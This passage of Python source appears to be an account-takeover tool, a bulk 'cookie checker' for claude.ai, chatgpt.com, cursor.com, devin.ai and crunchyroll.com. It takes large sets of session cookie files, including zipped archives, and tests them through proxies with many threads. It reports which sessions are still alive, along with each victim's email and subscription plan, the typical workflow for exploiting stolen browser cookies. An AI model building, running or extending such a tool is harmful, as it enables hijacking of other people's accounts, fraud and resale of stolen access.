                                    result["info"]["benefits"] = [b.get("benefit", b.get("__class__", "")) for b in benefit_items[:5]]
                        except:
                            pass
                except:
                    pass

    except Exception as e:
        result["error"] = str(e)

    return result


# ─── Checker Registry ────────────────────────────────────────────────────────
CHECKERS = {
    "claude.ai": check_claude,
    "chatgpt.com": check_chatgpt,
    "cursor.com": check_cursor,
    "devin.ai": check_devin,
    "crunchyroll.com": check_crunchyroll,
}


# ─── Display ─────────────────────────────────────────────────────────────────
def print_result(filename: str, site: str, result: dict):
    """Pretty-print a check result."""
    cfg = SITES.get(site, {"color": "", "icon": "⚪"})
    color = cfg["color"]
    icon = cfg["icon"]

    status = f"\033[92m ALIVE \033[0m" if result["alive"] else f"\033[91m DEAD \033[0m"
    print(f"\n  {icon} {color}{site}{RESET}  [{status}]  ← {filename}")

    if result.get("error"):
        print(f"     ⚠ Error: {result['error']}")

    info = result.get("info", {})
    if info:
        for key, value in info.items():
            if key in ("capabilities", "groups", "models") and isinstance(value, list):
                value = ", ".join(str(v) for v in value[:10])
                if len(str(value)) > 80:
                    value = value[:80] + "…"
            elif isinstance(value, dict):
                value = json.dumps(value)[:100]
            elif isinstance(value, str) and len(value) > 100:
                value = value[:100] + "…"
            print(f"     {key}: {value}")


# ─── Main Logic ──────────────────────────────────────────────────────────────
_print_lock = threading.Lock()


def _check_one(filepath: str, proxy: str | None) -> dict:
    """Check a single cookie file with retry on transient errors."""
    filename = os.path.basename(filepath)
    try:
        cookies = load_cookie_file(filepath)
        if not cookies:
            return {"file": filename, "status": "error", "reason": "no cookies"}
    except Exception as e:
        return {"file": filename, "status": "error", "reason": str(e)}

    site = detect_site(cookies, filename)
    if not site:
        return {"file": filename, "status": "error", "reason": "unknown site"}

    checker = CHECKERS.get(site)
    if not checker:
        return {"file": filename, "status": "error", "reason": f"no checker for {site}"}

    last_error = ""
    for attempt in range(2):
        try:
            result = checker(cookies, proxy)
            if result["alive"]:
                return {"file": filename, "site": site, "status": "alive", "info": result.get("info", {})}
            else:
                last_error = result.get("error", "")
                if not last_error:
                    break  # Clean dead, no need to retry
                # Transient error — retry once
                if attempt == 0:
                    time.sleep(1)
                    continue
                break
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            last_error = str(e)
            if attempt == 0:
                time.sleep(2)
                continue
            break
        except Exception as e:
            last_error = str(e)
            break

    return {"file": filename, "site": site, "status": "dead", "info": {}, "error": last_error}


def process_cookies(cookie_files: list[str], proxy: str | None = None, threads: int = 10) -> dict:
    """Process all cookie files with multi-threading and return results."""
    all_results = {"alive": [], "dead": [], "errors": []}
    total = len(cookie_files)
    done = 0
    alive_count = 0
    dead_count = 0

    print(f"\n[*] Checking {total} cookie files with {threads} threads …\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(_check_one, fp, proxy): fp for fp in cookie_files}

        for future in as_completed(futures):
            done += 1
            r = future.result()
            filename = r["file"]
            site = r.get("site", "?")
            status = r["status"]

            if status == "alive":
                alive_count += 1
                all_results["alive"].append({"file": filename, "site": site, "info": r["info"]})
                cfg = SITES.get(site, {"icon": "⚪"})
                email = r["info"].get("email", r["info"].get("username", r["info"].get("name", "")))
                plan = r["info"].get("plan", "")
                with _print_lock:
                    print(f"  [{done}/{total}] {cfg['icon']} \033[92mALIVE\033[0m  {site:20s} {str(email):30s} {str(plan):10s} ← {filename}")
            elif status == "dead":
                dead_count += 1
                all_results["dead"].append({"file": filename, "site": site, "error": r.get("error", "")})
                # Only print dead every 50 or at the end for less noise
                if dead_count % 50 == 0 or done == total:
                    with _print_lock:
                        print(f"  [{done}/{total}] Progress: {alive_count} alive, {dead_count} dead, {len(all_results['errors'])} errors")
            else:
                all_results["errors"].append(filename)

            # Progress bar every 100
            if done % 100 == 0 and done < total:
                with _print_lock:
                    pct = int(done / total * 100)
                    print(f"  [{done}/{total}] ({pct}%) — {alive_count} alive, {dead_count} dead")

    return all_results


def extract_zip(zip_path: str, extract_to: str) -> list[str]:
    """Extract a zip file and return paths to cookie files inside."""
    with zipfile.ZipFile(zip_path, "r") as zf:
        zf.extractall(extract_to)

    files = []
    for root, _, filenames in os.walk(extract_to):
        for fn in filenames:
            fp = os.path.join(root, fn)
            if fn.endswith((".json", ".txt", ".cookie", ".cookies")):
                files.append(fp)
            else:
                # Try to detect if it's a cookie file by content
                try:
                    content = Path(fp).read_text(errors="ignore")[:500]
                    if any(x in content for x in ['"name"', '"value"', "sessionKey", "__Secure", "etp_rt", "TRUE\t", "FALSE\t"]):
                        files.append(fp)
                except:
                    pass
    return files


# ─── Interactive Mode ────────────────────────────────────────────────────────
def interactive_mode():
    print("""
╔══════════════════════════════════════════════════════╗
║         Multi-Site Cookie Checker                    ║
║  claude.ai · chatgpt.com · cursor.com                ║
║  devin.ai  · crunchyroll.com                         ║
╚══════════════════════════════════════════════════════╝
    """)

    # ── Input ────────────────────────────────────────────
    path = input("[?] Cookies path (file, folder, or .zip): ").strip()
    if not path:
        print("[!] No path provided")
        sys.exit(1)

    # ── Proxy ────────────────────────────────────────────
    proxy = input("[?] Proxy (press Enter for none): ").strip()
    if proxy:
        # Auto-format proxy
        if not proxy.startswith(("http://", "https://", "socks")):
            parts = proxy.split(":")
            if len(parts) == 4:
                proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                proxy = f"http://{parts[0]}:{parts[1]}"
        print(f"[+] Using proxy: {proxy[:60]}{'…' if len(proxy) > 60 else ''}")
    else:
        proxy = None
        print("[*] No proxy — direct connection")

    # ── Collect files ────────────────────────────────────
    cookie_files = []

    if path.endswith(".zip") and os.path.isfile(path):
        extract_dir = os.path.join(os.path.dirname(path) or ".", "cookies_extracted")
        os.makedirs(extract_dir, exist_ok=True)
        print(f"[*] Extracting {path} …")
        cookie_files = extract_zip(path, extract_dir)
        print(f"[+] Found {len(cookie_files)} cookie file(s)")

    elif os.path.isdir(path):
        for root, _, fns in os.walk(path):
            for fn in sorted(fns):
                fp = os.path.join(root, fn)
                if os.path.isfile(fp):
                    cookie_files.append(fp)
        print(f"[+] Found {len(cookie_files)} file(s) in folder")

    elif os.path.isfile(path):
        cookie_files = [path]
        print(f"[+] Single file: {os.path.basename(path)}")

    else:
        print(f"[!] Path not found: {path}")
        sys.exit(1)

    if not cookie_files:
        print("[!] No cookie files found")
        sys.exit(1)

    # ── Threads ───────────────────────────────────────────
    threads_input = input("[?] Threads (default=10): ").strip()
    threads = int(threads_input) if threads_input.isdigit() else 10

    # ── Summary ──────────────────────────────────────────
    print(f"\n{'─' * 50}")
    print(f"  Files to check: {len(cookie_files)}")
    print(f"  Proxy: {proxy or 'None'}")
    print(f"  Threads: {threads}")
    print(f"{'─' * 50}")
    confirm = input("\n[?] Start checking? (Y/n): ").strip().lower()
    if confirm in ("n", "no"):
        print("[*] Aborted.")
        sys.exit(0)

    # ── Run ──────────────────────────────────────────────
    results = process_cookies(cookie_files, proxy, threads)

    # ── Final Report ─────────────────────────────────────
    total = len(results["alive"]) + len(results["dead"])
    print(f"\n{'═' * 50}")
    print(f"  RESULTS: {len(results['alive'])}/{total} ALIVE")
    print(f"{'═' * 50}")

    if results["alive"]:
        print(f"\n  \033[92m✓ ALIVE ({len(results['alive'])})\033[0m")
        for r in results["alive"]:
            plan = r["info"].get("plan", "")
            email = r["info"].get("email", r["info"].get("username", ""))
            print(f"    {SITES[r['site']]['icon']} {r['site']:20s} {email:30s} {plan:10s} ← {r['file']}")

    if results["dead"]:
        print(f"\n  \033[91m✗ DEAD ({len(results['dead'])})\033[0m")
        if len(results["dead"]) <= 20:
            for r in results["dead"]:
                print(f"    ✗ {r['site']:20s} ← {r['file']}")
        else:
            from collections import Counter
            site_counts = Counter(r["site"] for r in results["dead"])
            for site, count in site_counts.most_common():
                print(f"    ✗ {site:20s} × {count}")

    if results["errors"]:
        print(f"\n  \033[93m⚠ ERRORS ({len(results['errors'])})\033[0m")
        for f in results["errors"]:
            print(f"    ? {f}")

    # Save results
    out_file = "checker_results.json"
    with open(out_file, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n[+] Full results saved → {out_file}")


# ─── CLI Mode ────────────────────────────────────────────────────────────────
def cli_mode():
    parser = argparse.ArgumentParser(description="Multi-site cookie checker")
    parser.add_argument("-f", "--file", required=True, help="Cookie file, folder, or .zip")
    parser.add_argument("--proxy", type=str, default=None, help="Proxy (http://user:pass@host:port)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    args = parser.parse_args()

    path = args.file
    proxy = args.proxy

    # Format proxy
    if proxy and not proxy.startswith(("http://", "https://", "socks")):
        parts = proxy.split(":")
        if len(parts) == 4:
            proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            proxy = f"http://{parts[0]}:{parts[1]}"

    cookie_files = []
    if path.endswith(".zip") and os.path.isfile(path):
        extract_dir = os.path.join(os.path.dirname(path) or ".", "cookies_extracted")
        os.makedirs(extract_dir, exist_ok=True)
        cookie_files = extract_zip(path, extract_dir)
    elif os.path.isdir(path):
        for root, _, fns in os.walk(path):
            for fn in sorted(fns):
                fp = os.path.join(root, fn)
                if os.path.isfile(fp):
                    cookie_files.append(fp)
    elif os.path.isfile(path):
        cookie_files = [path]

    if not cookie_files:
        print("[!] No cookie files found")
        sys.exit(1)

    results = process_cookies(cookie_files, proxy, args.threads)

    total = len(results["alive"]) + len(results["dead"])
    print(f"\n{'═' * 50}")
    print(f"  RESULTS: {len(results['alive'])}/{total} ALIVE")
    print(f"{'═' * 50}")

    if results["alive"]:
        for r in results["alive"]:
            plan = r["info"].get("plan", "")
            email = r["info"].get("email", r["info"].get("username", ""))
            print(f"  ✓ {r['site']:20s} {str(email):30s} {str(plan):10s} ← {r['file']}")
    if results["dead"]:
        if len(results["dead"]) <= 20:
            for r in results["dead"]:
                print(f"  ✗ {r['site']:20s} ← {r['file']}")
        else:
            from collections import Counter
            site_counts = Counter(r["site"] for r in results["dead"])
            for site, count in site_counts.most_common():
                print(f"  ✗ {site:20s} × {count}")

    out_file = "checker_results.json"
    with open(out_file, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n[+] Results → {out_file}")


# ─── Entry Point ─────────────────────────────────────────────────────────────
def main():
    if len(sys.argv) > 1:
        cli_mode()
    else:
        interactive_mode()


if __name__ == "__main__":
    main()
